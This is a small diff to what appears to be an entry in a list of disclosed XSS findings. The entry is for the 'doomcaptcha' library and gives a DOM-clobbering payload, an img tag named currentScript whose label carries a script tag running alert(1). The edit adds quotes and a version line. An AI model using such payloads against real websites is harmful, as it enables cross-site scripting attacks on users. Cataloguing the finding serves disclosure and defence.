@@ -4,7 +4,8 @@
 
 + Library: doomcaptcha
 + Stars: 1K
-+ Payload: ```<img name=currentScript label="<script>alert(1)</script>"></img>```
++ Version: latest
++ Payload: ```<img name="currentScript" label="<script>alert(1)</script>"></img>```
 + Impact: XSS
 + CVE: N/A
 + Foundby: TheHulk
